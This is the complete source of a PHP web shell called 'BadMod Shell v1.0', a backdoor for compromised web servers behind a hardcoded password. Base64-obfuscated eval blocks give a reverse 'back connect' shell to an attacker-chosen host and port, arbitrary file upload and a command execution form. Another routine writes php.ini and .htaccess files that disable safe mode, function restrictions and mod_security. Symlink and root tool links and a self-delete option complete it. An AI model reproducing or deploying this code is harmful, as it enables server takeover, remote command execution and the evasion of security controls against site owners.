<html>
<head>
</head>
<body>
<!-- Hacked -->
</body>
</html>
<?php
$create_password = true;
$password = "1231";// => ur fucking pass
$password = md5($password);
$background = array ("http://cdn.akamai.steamstatic.com/steamcommunity/public/images/items/383690/f7a121a3f7a929ffb4dbc3ae241b3b4b6eaaed1d.jpg","http://sf.co.ua/13/04/wallpaper-1669649.jpg","http://vignette1.wikia.nocookie.net/steamtradingcards/images/a/a7/Borealis_Background_Digital.png/revision/latest?cb=20140927233900","https://i.imgur.com/5K7OpSU.jpg");
$style="
<!-- Hacked -->
<style>
body,background{background:black;}
body,table{background:black;}
A:link {text-decoration: none;color: red;}
A:active {text-decoration: none;color: red;}
A:visited {text-decoration: none;color: red;}
A:hover {text-decoration: underline; color: red;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold;}
input:hover,tr:hover,td:hover{background-color: #252525; color:green;}


input[type=submit]{

	padding: 5px;

	border:1px solid #ccc;

	background: #f9f9f9;

	border-radius: 5px;

	cursor: pointer;

	color:#000;

	transition: all 0.2s;

}

input[type=submit]:hover{

	box-shadow: 0 0 2px red;

}

input[type=text]{

	color:#000;	

	border:1px solid #ccc;

	background: red;

	padding: 5px;

	width: 300px;

	transition: all 0.5s;

}	

input[type=text]:focus{

	box-shadow: 0 0 30px red;

}

body,td,th{ border:0px; ;font: 9pt Tahoma,Verdana;margin:0;vertical-align:top;color:#00A700; }

table.info{ padding: 0 15px; color:#fff; background-color:#000; }

span,h1,a{ color: #004A00 !important; }

span{ font-weight: bolder; }

h1{ padding: 0px 5px;font: 14pt Verdana;background-color:#000;margin:0px; }

div.content{ padding: 7px;margin-left:7px;background-color:#003300; }

a{ text-decoration:none; }

a:hover{ text-decoration:underline; }

.ml1{ border:1px solid #004000;padding:5px;margin:0;overflow: auto; }

.bigarea{ width:100%;height:250px; }

input,textarea,select{ margin:0;color:#fff;background-color:#004000;border:1px solid #00FF00; font: 9pt Monospace,'Courier New'; }

form{ margin:0px; }

#toolsTbl{ text-align:center; }

.toolsInp{ width: 300px }

.main th{text-align:left;background-color:#003300;}

.main tr:hover{border:2px outset gray;;background-color:#000}

.l1{background-color:#004000}

.l2{background-color:#003300}

pre{font-family:Courier,Monospace;}

/* latin-ext */

@font-face {

  font-family: 'Audiowide';

  font-style: normal;

  font-weight: 400;

  src: local('Audiowide Regular'), local('Audiowide-Regular'), url(https://fonts.gstatic.com/s/audiowide/v5/7pSgz2MbVvTCvvm7vukSHxJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');

  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;

}

/* latin */

@font-face {

  font-family: 'Audiowide';

  font-style: normal;

  font-weight: 400;

  src: local('Audiowide Regular'), local('Audiowide-Regular'), url(https://fonts.gstatic.com/s/audiowide/v5/8XtYtNKEyyZh481XVWfVOltXRa8TVwTICgirnJhmVJw.woff2) format('woff2');

  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;

}



.yemen3{

	

	font-family: 'Audiowide', cursive;



} 



</style>";

error_reporting(0);

@session_start();

@set_time_limit(0);

@set_magic_quotes_runtime(0);

$usr_ip = $_SERVER["REMOTE_ADDR"];

$ver= "~! Login !~";  $pass=$_POST['pass']; $pass=md5($pass); if($pass==$password){ $_SESSION['yea']="$pass"; } if ($_SERVER["HTTP_CLIENT_IP"])  $ip = $_SERVER["HTTP_CLIENT_IP"]; else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"]; else $ip = $_SERVER['REMOTE_ADDR']; $ip=htmlspecialchars($ip);  if($create_password==true){  if(!isset($_SESSION['yea']) or $_SESSION['yea']!=$password){ die(" <style>$style</style> <title>$ver</title> <center><br><hr color=black></b> </center> <center><form method=post><font color=#009CFF size=2 class=yemen3><pre>
@@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@
<center><input type=password name=pass size=20 tabindex=1> <input type=hidden type=submit value=login size=40><br></center> 

</pre> </b></form></center>");}} ?><?php
/*
//||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
// #########################################################/|
// #                                                       #/|
// #     >.< this shell By MrSqar [Mohamed fadhl] >.<      #/|
// #                                                       #/|
// #             Email: MrSqar@gmail.com                   #/|
// #                                                       #/|
// #             www.facebook.com/MrSqar                   #/|
// #                                                       #/|
// #                 MaDe In Yemen                         #/|
// #########################################################/|
/////////////////////////////////////////////////////////////|
*/
?>
<html>
<head>
<title>BadMod Shell v1.0</title>
<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Maven+Pro" rel="stylesheet">
<style>
html {
        background: url(http://cdn.akamai.steamstatic.com/steamcommunity/public/images/items/383690/f7a121a3f7a929ffb4dbc3ae241b3b4b6eaaed1d.jpg) no-repeat center center fixed;

        -webkit-background-size: cover;

        -moz-background-size: cover;

        -o-background-size: cover;

        background-size: cover;
}
	@font-face{font-family:'rawy-bold';src:url('https://www.fontstatic.com/fonts/rawy-bold/rawy-bold.eot?#iefix');src:local('راوي ثقيل'),local('rawy-bold'),url('https://www.fontstatic.com/fonts/rawy-bold/rawy-bold.woff') format('woff');}

.ar{

	font-family: 'rawy-bold';

	}
.font1{
font-family: 'Maven Pro', sans-serif;

	}




@font-face{font-family:'rawy-bold';src:url('https://www.fontstatic.com/fonts/rawy-bold/rawy-bold.eot?#iefix');src:local('راوي ثقيل'),local('rawy-bold'),url('https://www.fontstatic.com/fonts/rawy-bold/rawy-bold.woff') format('woff');}

.ar{

	font-family: 'rawy-bold';

	}

    

/* latin-ext */

@font-face {

  font-family: 'Audiowide';

  font-style: normal;

  font-weight: 400;

  src: local('Audiowide Regular'), local('Audiowide-Regular'), url(https://fonts.gstatic.com/s/audiowide/v5/7pSgz2MbVvTCvvm7vukSHxJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');

  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;

}

/* latin */

@font-face {

  font-family: 'Audiowide';

  font-style: normal;

  font-weight: 400;

  src: local('Audiowide Regular'), local('Audiowide-Regular'), url(https://fonts.gstatic.com/s/audiowide/v5/8XtYtNKEyyZh481XVWfVOltXRa8TVwTICgirnJhmVJw.woff2) format('woff2');

  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;

}
.yemen3{
	font-family: 'Audiowide', cursive;
}        
    @font-face {
  font-family: 'Comfortaa';
  font-style: normal;
  font-weight: 400;
  src: local('Comfortaa Regular'), local('Comfortaa-Regular'), url(https://fonts.gstatic.com/s/comfortaa/v10/qLBu5CQmSMt1H43OiWJ77VtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}
.yemen2 {
  font-family: 'Comfortaa', cursive;
}
.input {
  width: 150px;
  border: 1px solid #999;
  height: 26px;
 -webkit-box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.3);
  -moz-box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.3);
}
input[type=text]{ padding: 3px; color: #0076B1; text-shadow: #0076B1 0px 0px 3px; border: 1px solid #0076B1; background: transparent; box-shadow: 0px 0px 4px #0076B1;    padding: 3px;   -webkit-border-radius: 4px;   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px;   -moz-box-shadow: #0076B1 0px 0px 4px;} 
.btn {
  -webkit-border-radius: 80;
  -moz-border-radius: 80;
  border-radius: 70px;
  font-family: Arial;
  color: #ffffff;
  background: #350F1E;
  text-decoration: none;
}
.btn:hover {
background: #002136;
  background-image: -webkit-linear-gradient(top, #002136, #040040);
  background-image: -moz-linear-gradient(top, #002136, #040040);
  background-image: -ms-linear-gradient(top, #002136, #040040);
  background-image: -o-linear-gradient(top, #002136, #040040);
  background-image: linear-gradient(to bottom, #002136, #040040);
  text-decoration: none;
}
#a{color:#26FF00}
#a1{color:#FCFF00}
/* latin */
@font-face {
  font-family: 'Aldrich';
  font-style: normal;
  font-weight: 400;
  src: local('Aldrich Regular'), local('Aldrich-Regular'), url(https://fonts.gstatic.com/s/aldrich/v7/j-NnyokbAnhXANS2iZ6Jew.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}
.yemen3{
	font-family: 'Aldrich', sans-serif;
		}
/* latin */
@font-face {
  font-family: 'Nova Square';
  font-style: normal;
  font-weight: 400;
  src: local('Nova Square'), local('NovaSquare'), url(https://fonts.gstatic.com/s/novasquare/v8/YsNHj2Yx5KzHzIjNe-czdI4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}
.font {
	font-family: 'Nova Square', cursive;
	}
.textra {
  color: #05FFF6;
  font-size: 9pt;
  text-shadow: #0076B1 0px 2px 7px;
  border: solid 1px #0076B1;
  background-color: transparent;
  box-shadow: 0px 0px 4px #009900;
  padding: 3px;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  border-radius: 4px;
  -webkit-box-shadow: rgb(0,119,0) 0px 0px ;
}
tr:hover{background:#000000;}
.trhead,.trhead:hover{background:-moz-linear-gradient(center top , #DBFFDC, #AAAAAA);background:-webkit-linear-gradient(#EEEEEE, #AAAAAA);}
tr,td{border-collapse: collapse;border:1px solid #aaa;color :#363636;}
td{padding:3px;color:#0076B1;text-shadow:0px 0px 10px #708090;display: inline;font-family: cursive;font-size: 18px;font-weight: bold;height:
auto;text-align: -webkit-center;width: auto;}
td a{color:#0076B1;text-shadow:0px 0px 10px #878F98;}
</style>
<style>
A:link {text-decoration: none; color: } 
A:visited {text-decoration: none; color: } 
A:active {text-decoration: none; color: } 
A:hover {text-decoration: none; color: } 
#a1{color:#86FF67}
</style>  

</head>
<body>
<center>
<b><font color="#00B4AB" size="7" class="font1">BadMod Shell v1.0</font></b>
<br>
<img border="0" src="https://www.mexatk.com/wp-content/uploads/2016/12/صور-الوان-علم-اليمن.gif" style="opacity:1;filter:alpha(opacity=5)"  height="400" weight="700"<br><br></a></p>
<br>
<br>
<pre>
<a href="?home" 	 class="btn"><font color="white" size="4" class="yemen3">Home</font></a>  <a href="?bc"  		 class="btn"><font color="white" size="4" class="yemen3">Back Connect </font></a>  <a href="?upload"    class="btn"><font color="white" size="4" class="yemen3">Upload</font></a>  <a href="?tools" 	 class="btn"><font color="white" size="4" class="yemen3">Tools </font></a>  <a href="?kill" 	 class="btn"><font color="white" size="4" class="yemen3">kill me </font></a></pre>
</pre>
</center>
</body>
</html>
<?php
$home = @$_GET["home"];
$bc = @$_GET["bc"];
$upload = @$_GET["upload"];
$tools = @$_GET["tools"];
$kill = @$_GET["kill"];

if(isset($home)){
   echo '<br> <font color="white" size="5px" class="yemen2">'.'<center>'." This shell coded by MrSqar H@cker".'</font></center><br>';
   echo '<br> <font color="white" size="5px" class="yemen2">'.'<center>'." Geeks family".'</font></center><br>';
   echo '<br> <font color="white" size="3px" class="yemen2">'.'<center>'."Contact : mrsqar@gmail".'</font></center><br>';	
}
if(isset($bc)){
eval(base64_decode("CSR1cl9pcCA9JF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQoJZWNobyAiDQoJPGNlbnRlcj48YnI+PGZvbnQgY29sb3I9JyMwMDlERkEnIHNpemU9JzEwJyBjbGFzcz0neWVtZW4zJz4gQmFjayBDb25uZWN0IH5ffjwvZm9udD48YnI+PGJyPiI7IA0KPz4gICAJDQoJPGJyPg0KCTxicj4NCgkNCiAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiID4NCiAgICAgICAgIA0KICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIDxmb250IGNvbG9yPSIjMDA5REZBIiBzaXplPSI0cHgiIGNsYXNzPSJ5ZW1lbjMiPklwIDogICA8L2ZvbnQ+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHN0eWxlPSJ3aWR0aDogMjAwcHg7IiBuYW1lPSJpcCIgY2xhc3M9InRleHRyYSIgdmFsdWU9Jzw/ICR1cl9pcCA/PicgLz4NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICA8Zm9udCBjb2xvcj0iIzAwOURGQSIgc2l6ZT0iNHB4IiBjbGFzcz0ieWVtZW4zIj5Qb3J0IDogICA8L2ZvbnQ+DQogICAgICAgICAgICAgICA8aW5wdXQgc3R5bGU9IndpZHRoOiAxMDBweDsiIGNsYXNzPSJ0ZXh0cmEiIG5hbWU9InBvcnQiIHNpemU9IjUiIHZhbHVlPSI0NDQ0Ii8+DQogICAgICAgICAgICAgICAgPGlucHV0IHN0eWxlPSJ3aWR0aDogOTBweDsiIGNsYXNzPSJidG4iIG5hbWU9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ii8+DQogICAgIA0KICAgICAgICAgPC9mb3JtPg0KDQo8Pw0KaWYgKGlzc2V0KCRfUE9TVFsic3VibWl0Il0pKXsNCiAgICRpcCA9IEAkX1BPU1RbImlwIl07DQogICAkcG9ydCA9IEAkX1BPU1RbInBvcnQiXTsNCiAgIGlmICghZW1wdHkoJGlwKSBBTkQgIWVtcHR5KCRwb3J0KSl7DQoJICAgaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywwKTsNCiAgICAgICAgJHNvY2tmZD1mc29ja29wZW4oJGlwICwgJHBvcnQgLCAkZXJybm8sICRlcnJzdHIgKTsgDQppZigkZXJybm8gIT0gMCkNCiAgICAgICAgew0KICAgICAgICAgICAgZWNobyAiPGZvbnQgY29sb3I9J3JlZCc+PGI+JGVycm5vPC9iPiA6ICRlcnJzdHI8L2ZvbnQ+IjsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmICghJHNvY2tmZCkNCiAgICAgICAgeyANCiAgICAgICAgICAgICAgICRyZXN1bHQgPSAiPGZvbnQgY29sb3I9J3JlZCc+PHA+PGgzPkVycm9yICEhISE8L2gzPjwvcD4iOw0KICAgICAgICB9IA0KICAgICAgICBlbHNlDQogICAgICAgIHsgDQoJCWZwdXRzKCRzb2NrZmQsIlxuXG4NCiAgICAgICAgICAgICAgID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbg0KICAgICAgICAgICAgICAgKyBNclNxYXIgcHJpdjggc2gzbGwgICAgICAgICAgICAgICAgICAgICAgICAgK1xuDQogICAgICAgICAgICAgICArIENvbnRhY3QgOiBtcnNxYXJAZ21haWwuY29tICAgICAgICAgICAgICAgICArXG4NCiAgICAgICAgICAgICAgICsgZ3JlZXR6IDogS2FIYXdrICBeX14gICAgICAgICAgICAgICAgICAgICAgICtcbg0KICAgICAgICAgICAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsJDQokbWFzYXIgPSBAc2hlbGxfZXhlYygicHdkIik7DQokdW5hbWUgPSBAc2hlbGxfZXhlYygidW5hbWUgLWEiKTsNCiRpZCA9IEBzaGVsbF9leGVjKCJpZCIpOw0KJGxlbiA9IDEzMzc7DQoNCgkJZnB1dHMoJHNvY2tmZCwiWW91ciBwYXRoIDogIi4kbWFzYXIuIlxuIik7DQoJCWZwdXRzKCRzb2NrZmQsIlNlcnZlciB1bmFtZSA6ICIuJHVuYW1lLiJcbiIpOw0KCQlmcHV0cygkc29ja2ZkLCJJZCA6ICIuJGlkLiJcbiIpOwkJCQ0KCQlkbyB7DQoJCQkNCgkJCSRjbWRQcm9tcHQgPSJyb290QG1yc3FhcjpbJF0+ICI7DQogICAgICAgICAgICBmcHV0cyAoJHNvY2tmZCAsICRjbWRQcm9tcHQgKTsgDQogICAgICAgICAgICAkY29tbWFuZD0gZmdldHMoJHNvY2tmZCwgJGxlbik7DQogICAgICAgICAgICBmcHV0cygkc29ja2ZkICwgIlxuIiAuIHNoZWxsX2V4ZWMoJGNvbW1hbmQpIC4gIlxuXG4iKTsNCg0KCQkJDQoJCQkNCgkJCX13aGlsZSghZmVvZigkc29ja2ZkKSk7CQ0KCQkJDQoJCQkNCgl9DQoJICAgCSAgIA0KCSAgIA0KCSAgIH0JCQ0KIH0g"));
}
if(isset($upload)){
eval(base64_decode("CSRsaW5rID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iLyI7DQoJZWNobyAiPGNlbnRlcj48Zm9udCBjb2xvcj0nIzAwQkJDRCcgc2l6ZT0nMTBweCcgY2xhc3M9J3llbWVuMyc+VXBsb2FkIGZpbGVzIjsNCiAgICBlY2hvIjxjZW50ZXI+PGJyPjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YSBjbGFzcz0ndGV4dHJhJz4iOyANCiAgICBlY2hvIjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1mPjxpbnB1dCBuYW1lPXYgdHlwZT1zdWJtaXQgaWQ9diB2YWx1ZT11cCBjbGFzcz0ndGV4dHJhJz48YnI+IjsgDQogICAgICBpZigkX1BPU1RbInYiXT09J3VwJykNCnsgaWYoQGNvcHkoJF9GSUxFU1siZiJdWyJ0bXBfbmFtZSJdLCRfRklMRVNbImYiXVsibmFtZSJdKSl7ZWNobyI8aDM+PGI+PGNlbnRlcj48Zm9udCBjb2xvcj0nIzAwQkJDRCcgc2l6ZT0nNXB4JyBjbGFzcz0neWVtZW4zJz5VcGxhb2QgZG9uZSAtLT4gPC9mb250PjwvYj4iLiI8Zm9udCBjb2xvcj0nIzAwQkJDRCcgc2l6ZT0nNXB4JyBjbGFzcz0neWVtZW4zJz4iLiRfRklMRVNbImYiXVsibmFtZSJdLiI8L2gzPjwvYj4iO31lbHNle2VjaG8iPGI+PGJyPiBFcnJvciAhISA8L2I+Ijt9fQ0KOw=="));
}
if(isset($tools)){
		 echo '<br><br>';
  echo '<center><a href="?cmd" class="btn"><font color="white" size="5px" class="yemen3">Command excute </font></a></center>';
    echo '<br>';
  echo '<center><a href="?bypass" class="btn"><font color="white" size="5px" class="yemen3">ByPass SafeMod</font></a></center>';
    echo '<br>';
  echo '<center><a href="?Symlink" class="btn"><font color="white" size="5px" class="yemen3">Symlink</font></a></center>';
    echo '<br>';
  echo '<center><a href="?root" class="btn"><font color="white" size="5px" class="yemen3">R00T</font></a></center>';
    echo '<br>';
}
if (isset($_GET["cmd"])){

eval(base64_decode("CSRjbWRjID0gQCRfUE9TVFsiQ01EIl07DQoJZWNobyAiPGJyPiI7DQoJZWNobyAiPGJyPiI7DQoJZWNobyAiPGNlbnRlcj4iOw0KCWVjaG8gIjxmb250IGNvbG9yID0nIzA1RkZGNicgc2l6ZT0nNScgY2xhc3M9J3llbWVuMyc+Ii4iY21kIGV4YyI7DQoJZWNobyAnPGNlbnRlcj48Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJQT1NUIj4nOw0KICAgIGVjaG8gJwk8dGV4dGFyZWEgcm93cz0iMTMiIG5hbWU9InRleHQiIHZhbHVlPSJweXQiIGNvbHM9IjcwIiBjbGFzcz0idGV4dHJhIiB2YWx1ZT0iaGVsbG8gIj4nLnNoZWxsX2V4ZWMoJGNtZGMpLic8L3RleHRhcmVhPic7DQogICAgZWNobyAnCTxicj4NCgk8Zm9udCBjb2xvcj0iIzAwQkVGQSIgc2l6ZT0iNHB4Ij5Db21tbWFuZCBoZXJlPC9mb250PjxiUj48aW5wdXQgbmFtZT0iQ01EIiB0eXBlPSJ0ZXh0Ij4NCgk8YnI+DQoJPGJyPg0KCTxpbnB1dCBuYW1lPSJEbyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRG8gSXQiIGNsYXNzPSJidG4iPg0KCTwvZm9ybT4nOw=="));

	}
if (isset($_GET["bypass"])){	

$bypass = fopen("php.ini","w") or die("Error !!!");

fwrite($bypass,"safe_mode = OFF\ndisable_functions = NONE\nsafe_mode_gid = OFF\nopen_basedir = OFF ");

chmod("php.ini",0755);

fclose($bypass); 

$htac = "<IfModule mod_security.c>

Sec------Engine Off

Sec------ScanPOST Off

</IfModule>";
        $name1 = ".htaccess";
        $nameD = "$name1";
        $bypassing = fopen($nameD,"w");
        fwrite($bypassing,$htac);
        fclose($bypassing);
 if ($bypass){

$safe = ini_get("safe_mode");

if($safe == 1){

	$safe_mode =  '<center><br><font color="#FF6159" size="6px" class="yemen2">Oh shit php.ini created but the safe mod ON Try now to use cgi shell !!</font>';

	}else{

		$safe_mode = '<center><font color="#00FFEE" size="6px" class="yemen2" >Lool php.ini created and safe mod OFF now Enjoy </font>';

		} 

	echo '<center><div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 6px #0012FF, 0 0 5px #0012FF, 0 0 5px #0012FF;color: #FFFFFF">';

	 echo $safe_mode;	 

	 }else {

	echo '<center><div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 6px #0012FF, 0 0 5px #0012FF, 0 0 5px #0012FF;color: #FFFFFF">';

	echo " <center>"." <font color = 'red' size='10' class='yemen2'>"."Cannot creat php.ini file !!"; 

	 }

	}

if(isset($kill)){

echo '<br><center>'.'<font color="#1E90FF" size="10" class="yemen3">'."Are you sure ? ".'<br>';

echo '<br><center>'.'<a href="?kill=me"><font color="#FF4F1E" size="5" class="yemen3">'."Yes".'</a>'."     ".'<a href="?kill=bc"><font color="#FF4F1E" size="5" class="yemen3">'." No" . '</font> </a>';

if (isset ($_GET["kill"]) && $_GET["kill"] == "me"){
function mrsqarSend($system){
	
	$system = system("$system");
	
	}
$shell_name = $_SERVER['PHP_SELF'];
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))){
echo '<br><br><b class="yemen2"><font color="#00BFFF" size="5px"><center><h3> Shell Deleted Done , Go0odbey</h3></center></font></b>';
} else {
	echo '<br><br><b class="yemen2"><font color="#00BFFF" size="5px"><center><h3> Error !!</h3></center></font></b>';
	}
	}
if (isset ($_GET["kill"]) && $_GET["kill"] == "bc"){
 echo "<br><br>"."<center>"."   Delet canseled , enjoy ";
	}
} 
?>
 <?php 
$mrsqar=base64_decode("");
eval($mrsqar);
?>
